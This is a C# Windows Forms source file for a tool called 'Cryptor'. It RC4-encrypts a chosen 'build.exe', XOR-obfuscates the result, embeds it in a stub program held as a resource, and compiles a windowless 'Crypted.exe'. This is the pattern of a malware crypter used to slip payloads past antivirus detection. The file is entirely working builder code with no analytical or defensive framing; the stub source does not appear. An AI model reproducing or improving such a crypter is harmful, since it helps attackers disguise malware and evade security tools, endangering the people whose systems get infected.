﻿using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Cryptor
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            OpenFileDialog dialog = new OpenFileDialog();
            dialog.Filter = "build.exe |*.exe"; 
            if (dialog.ShowDialog() == DialogResult.OK)
                textBox1.Text = dialog.FileName;
        }
        static string ByteArrayToString(byte[] ba)
        {
            return BitConverter.ToString(ba).Replace("-", "");
        }
        static string RandomString(int size)
        {
            Random random = new Random((int)DateTime.Now.Ticks);
            StringBuilder builder = new StringBuilder();
            char ch;
            for (int i = 0; i < size; i++)
            {
                ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65)));
                builder.Append(ch);
            }
            return builder.ToString();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            Random rnd = new Random();
            int random = rnd.Next(6, 20);
            textBox2.Text = RandomString(random);
        }

        private void button3_Click(object sender, EventArgs e)
        {
            string bytesString = ByteArrayToString(RC4(Encoding.Default.GetBytes(textBox2.Text), File.ReadAllBytes(textBox1.Text)));
            CompilerParameters Params = new CompilerParameters();
            Params.GenerateExecutable = true;

            Params.ReferencedAssemblies.Add("System.dll"); 
            Params.CompilerOptions += "\n/t:winexe"; 
            Params.OutputAssembly = "Crypted.exe"; 

            string Source = Properties.Resources.Program; 
            Source = Source.Replace("[BYTES]", XOR(bytesString)); 
            Source = Source.Replace("[PASSWORD]", textBox2.Text);

            var settings = new Dictionary<string, string>();
            settings.Add("CompilerVersion", "v4.0");

            CompilerResults Results = new CSharpCodeProvider(settings).CompileAssemblyFromSource(Params, Source);

            if (Results.Errors.Count > 0)
            {
                foreach (CompilerError err in Results.Errors)
                    MessageBox.Show(err.ToString());
            }
            else
            {
                MessageBox.Show("Crypted!", "Cryptor");
            }
        }
        static byte[] RC4(byte[] pwd, byte[] data)
        {
            int a, i, j, k, tmp;
            int[] key, box;
            byte[] cipher;
            key = new int[256];
            box = new int[256];
            cipher = new byte[data.Length];
            for (i = 0; i < 256; i++)
            {
                key[i] = pwd[i % pwd.Length];
                box[i] = i;
            }
            for (j = i = 0; i < 256; i++)
            {
                j = (j + box[i] + key[i]) % 256;
                tmp = box[i];
                box[i] = box[j];
                box[j] = tmp;
            }
            for (a = j = i = 0; i < data.Length; i++)
            {
                a++;
                a %= 256;
                j += box[a];
                j %= 256;
                tmp = box[a];
                box[a] = box[j];
                box[j] = tmp;
                k = box[((box[a] + box[j]) % 256)];
                cipher[i] = (byte)(data[i] ^ k);
            }
            return cipher;
        }
        static string XOR(string target)
        {
            string result = "";
            for (int i = 0; i < target.Length; i++)
            {
                char ch = (char)(target[i] ^ 123);
                result += ch;
            }
            return result;
        }
    }
}

